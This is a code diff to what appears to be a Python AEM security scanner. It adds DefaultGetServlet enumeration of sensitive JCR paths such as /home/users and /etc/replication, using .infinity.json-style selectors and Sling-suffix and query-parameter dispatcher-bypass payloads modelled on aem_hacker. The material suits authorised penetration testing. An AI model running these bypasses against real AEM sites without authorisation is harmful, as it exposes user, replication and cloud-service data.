@@ -5,10 +5,11 @@ import re
 from typing import List, Dict, Optional, Any
 from dataclasses import dataclass
 
-from core.models import Finding, VulnSeverity, ScanPhase
+from core.models import Finding, VulnSeverity, ScanPhase, BypassTechnique
 from core.config import AEMConfig
 from core.engine import HTTPXEngine
 from core.phases import PhaseResult
+from bypass.transformers import BypassTransformer
 
 
 @dataclass
@@ -48,33 +49,215 @@ class JCRProbingModule:
         ".children.json", ".ext.json"
     ]
     
-    def __init__(self, engine: HTTPXEngine, config: AEMConfig):
+    def __init__(self, engine: HTTPXEngine, config: AEMConfig, bypass: BypassTransformer = None):
         self.engine = engine
         self.config = config
+        self.bypass = bypass
         self.nodes_cache: Dict[str, JCRNode] = {}
     
     async def run(self, base_url: str) -> List[Finding]:
         """Run full JCR probing suite."""
         findings = []
+        seen_urls: set = set()
+        
+        def _dedup_extend(new_findings):
+            for f in new_findings:
+                if f.url not in seen_urls:
+                    seen_urls.add(f.url)
+                    findings.append(f)
+        
+        # DefaultGetServlet enumeration (like aem_hacker) — tests root + key
+        # paths with selectors AND bypass variants (suffix, query param)
+        dgs_findings = await self._enumerate_default_get_servlet(base_url)
+        _dedup_extend(dgs_findings)
         
         # Test dangerous selectors
         selector_findings = await self._test_selectors(base_url)
-        findings.extend(selector_findings)
+        _dedup_extend(selector_findings)
         
         # Probe critical paths
         for path in self.CRITICAL_PATHS:
             path_findings = await self._probe_path(base_url, path)
-            findings.extend(path_findings)
+            _dedup_extend(path_findings)
         
         # Check for sensitive data exposure
         sensitive_findings = await self._check_sensitive_exposure(base_url)
-        findings.extend(sensitive_findings)
+        _dedup_extend(sensitive_findings)
         
         # QueryBuilder probe
         qb_findings = await self._probe_querybuilder(base_url)
-        findings.extend(qb_findings)
+        _dedup_extend(qb_findings)
         
         return findings
+    
+    def _get_bypass_enum(self, response) -> Optional[BypassTechnique]:
+        """Convert response bypass string to BypassTechnique enum."""
+        if response.bypass_used:
+            try:
+                return BypassTechnique(response.bypass_used)
+            except ValueError:
+                pass
+        return None
+    
+    async def _enumerate_default_get_servlet(self, base_url: str) -> List[Finding]:
+        """Enumerate DefaultGetServlet exposure with bypass variants.
+        
+        Mirrors aem_hacker's approach: for each base path + selector combo,
+        test the direct URL AND all bypass variants (Sling suffix, query
+        param extension).  Report every working variant as a separate finding
+        because each represents a distinct dispatcher bypass.
+        """
+        findings = []
+        seen_urls: set = set()
+        
+        # Paths to test (root is critical — aem_hacker always tests it)
+        dgs_paths = [
+            "/",
+            "/content",
+            "/content/dam",
+            "/etc",
+            "/etc/cloudservices",
+            "/etc/replication",
+            "/home/users",
+            "/home/groups",
+            "/var",
+            "/libs",
+            "/apps",
+        ]
+        
+        # Selectors that expose DefaultGetServlet
+        dgs_selectors = [
+            ".json",
+            ".children.json",
+            ".1.json",
+            ".infinity.json",
+            ".tidy.json",
+            ".ext.json",
+        ]
+        
+        # Sling suffix bypasses (append after selector)
+        suffix_bypasses = [
+            ("/ck.css",   BypassTechnique.SLING_SUFFIX, "Sling suffix .css"),
+            ("/ck.html",  BypassTechnique.SLING_SUFFIX, "Sling suffix .html"),
+            ("/ck.png",   BypassTechnique.SLING_SUFFIX, "Sling suffix .png"),
+            ("/ck.ico",   BypassTechnique.SLING_SUFFIX, "Sling suffix .ico"),
+            ("/ck.js",    BypassTechnique.SLING_SUFFIX, "Sling suffix .js"),
+            ("/ck.gif",   BypassTechnique.SLING_SUFFIX, "Sling suffix .gif"),
+        ]
+        
+        # Query param bypasses (append after selector)
+        query_bypasses = [
+            ("?ck.css",  BypassTechnique.QUERY_EXTENSION, "Query param .css"),
+            ("?ck.ico",  BypassTechnique.QUERY_EXTENSION, "Query param .ico"),
+            ("?ck.png",  BypassTechnique.QUERY_EXTENSION, "Query param .png"),
+            ("?ck.html", BypassTechnique.QUERY_EXTENSION, "Query param .html"),
+        ]
+        
+        all_bypasses = suffix_bypasses + query_bypasses
+        
+        for path in dgs_paths:
+            for selector in dgs_selectors:
+                base_endpoint = f"{path}{selector}"
+                
+                # 1. Test direct access
+                direct_url = f"{base_url}{base_endpoint}"
+                if direct_url in seen_urls:
+                    continue
+                seen_urls.add(direct_url)
+                
+                direct_resp = await self.engine.get(direct_url)
+                direct_works = (
+                    direct_resp.status_code == 200
+                    and not direct_resp.is_soft_404
+                    and self._is_valid_dgs_response(direct_resp.text)
+                )
+                
+                if direct_works:
+                    findings.append(Finding(
+                        phase=ScanPhase.DISCOVERY,
+                        technique="DefaultGetServlet",
+                        url=direct_url,
+                        severity=self._dgs_severity(path, selector),
+                        title=f"DefaultGetServlet: {base_endpoint}",
+                        description=f"Sensitive information exposed via DefaultGetServlet at {base_endpoint}",
+                        evidence={
+                            "path": path,
+                            "selector": selector,
+                            "response_size": len(direct_resp.text),
+                            "sample": direct_resp.text[:300],
+                        },
+                        chainable=True
+                    ))
+                
+                # 2. Test bypass variants — even if direct works, report
+                #    each working bypass because it proves the bypass technique
+                #    defeats dispatcher rules
+                for bypass_suffix, technique, desc in all_bypasses:
+                    bypass_url = f"{base_url}{base_endpoint}{bypass_suffix}"
+                    if bypass_url in seen_urls:
+                        continue
+                    seen_urls.add(bypass_url)
+                    
+                    resp = await self.engine.get(bypass_url)
+                    
+                    if (resp.status_code == 200
+                            and not resp.is_soft_404
+                            and self._is_valid_dgs_response(resp.text)):
+                        findings.append(Finding(
+                            phase=ScanPhase.DISCOVERY,
+                            technique="DefaultGetServlet",
+                            url=bypass_url,
+                            severity=self._dgs_severity(path, selector),
+                            title=f"DefaultGetServlet: {base_endpoint}{bypass_suffix}",
+                            description=f"DefaultGetServlet exposed via {desc} at {base_endpoint}",
+                            evidence={
+                                "path": path,
+                                "selector": selector,
+                                "bypass": bypass_suffix,
+                                "bypass_type": desc,
+                                "response_size": len(resp.text),
+                                "sample": resp.text[:300],
+                            },
+                            bypass_used=technique,
+                            chainable=True
+                        ))
+        
+        return findings
+    
+    def _is_valid_dgs_response(self, text: str) -> bool:
+        """Check if response looks like actual DefaultGetServlet JSON output."""
+        if not text or len(text) < 5:
+            return False
+        try:
+            data = json.loads(text)
+            if isinstance(data, dict):
+                # Must have JCR/Sling/CQ properties or child nodes
+                keys = set(data.keys())
+                jcr_indicators = {
+                    "jcr:primaryType", "jcr:mixinTypes", "jcr:createdBy",
+                    "jcr:created", "sling:resourceType", "cq:template",
+                    "cq:lastModified", "jcr:title", "jcr:description",
+                }
+                if keys & jcr_indicators:
+                    return True
+                # Also valid if it has child nodes (dict values that are dicts)
+                if any(isinstance(v, dict) for v in data.values()):
+                    return True
+            elif isinstance(data, list) and len(data) > 0:
+                return True
+        except (json.JSONDecodeError, ValueError):
+            pass
+        return False
+    
+    def _dgs_severity(self, path: str, selector: str) -> VulnSeverity:
+        """Assess severity of DefaultGetServlet exposure."""
+        if "infinity" in selector:
+            return VulnSeverity.CRITICAL
+        if path in ("/home/users", "/home/groups", "/etc/replication", "/etc/cloudservices"):
+            return VulnSeverity.HIGH
+        if path in ("/", "/content", "/content/dam", "/etc"):
+            return VulnSeverity.HIGH
+        return VulnSeverity.MEDIUM
     
     async def _test_selectors(self, base_url: str) -> List[Finding]:
         """Test dangerous selectors on various paths."""
